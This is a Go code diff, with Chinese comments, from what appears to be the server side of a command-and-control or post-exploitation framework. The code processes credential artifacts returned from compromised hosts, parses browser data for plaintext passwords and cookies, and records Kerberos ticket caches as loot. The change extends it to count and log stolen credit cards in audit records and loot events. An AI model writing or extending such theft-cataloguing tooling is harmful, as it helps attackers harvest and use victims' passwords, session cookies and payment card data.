@@ -187,13 +187,13 @@ func matchCredArtifact(uid, filePath, status string) bool {
 
 	// 浏览器制品额外做一件事：把明文口令/Cookie 解析出来登记进凭据库。
 	// 制品本体照样留档（复核用），但战果要立刻在凭据库里可见。
-	credCount, cookieCount, ticketCount := 0, 0, 0
+	credCount, cookieCount, ticketCount, cardCount := 0, 0, 0, 0
 	if req.Kind == cred.KindBrowser {
 		art, perr := cred.ParseBrowserArtifact(filePath)
 		if perr != nil {
 			logx.Warnf("⚠️ [CRED] 浏览器制品解析失败（制品本体仍留档）uid=%s file=%s: %v\n", uid, fileName, perr)
 		} else {
-			credCount, cookieCount = ingestBrowserArtifact(uid, art)
+			credCount, cookieCount, cardCount = ingestBrowserArtifact(uid, art)
 		}
 	}
 	// Kerberos 票据：每个 ccache 登记一条 ticket 战果（principal / 到期 / 票据数），
@@ -209,14 +209,15 @@ func matchCredArtifact(uid, filePath, status string) bool {
 
 	finishTask(req.TaskID, taskStatusCompleted, fmt.Sprintf("制品已回传: %s（%s）", filePath, info.Describe()), "")
 	auditDescription := fmt.Sprintf("%s 制品已回传: %s（%s）", req.Kind, fileName, info.Describe())
-	if credCount > 0 || cookieCount > 0 || ticketCount > 0 {
-		auditDescription += fmt.Sprintf("；已入库 %d 条口令、%d 条 Cookie、%d 个票据缓存",
-			credCount, cookieCount, ticketCount)
+	if credCount > 0 || cookieCount > 0 || ticketCount > 0 || cardCount > 0 {
+		auditDescription += fmt.Sprintf("；已入库 %d 条口令、%d 条 Cookie、%d 张信用卡、%d 个票据缓存",
+			credCount, cookieCount, cardCount, ticketCount)
 	}
 	auditLogEvent("CRED_ACCESS", "SUCCESS", auditDescription,
 		map[string]interface{}{
 			"uid": uid, "artifact": fileName, "size": info.Size, "kind": req.Kind,
-			"credentials": credCount, "cookies": cookieCount, "ticket_caches": ticketCount,
+			"credentials": credCount, "cookies": cookieCount, "cards": cardCount,
+			"ticket_caches": ticketCount,
 		})
 
 	note := ""
@@ -235,7 +236,8 @@ func matchCredArtifact(uid, filePath, status string) bool {
 	AddLootIfNotEmpty(uid, "dump", "", "", "", filePath, note, source)
 	command.PublishEvent(command.EventLootNew, uid, map[string]interface{}{
 		"type": "dump", "source": source, "file": fileName, "operator": req.Operator,
-		"credentials": credCount, "cookies": cookieCount, "ticket_caches": ticketCount,
+		"credentials": credCount, "cookies": cookieCount, "cards": cardCount,
+		"ticket_caches": ticketCount,
 	})
 	return true
 }
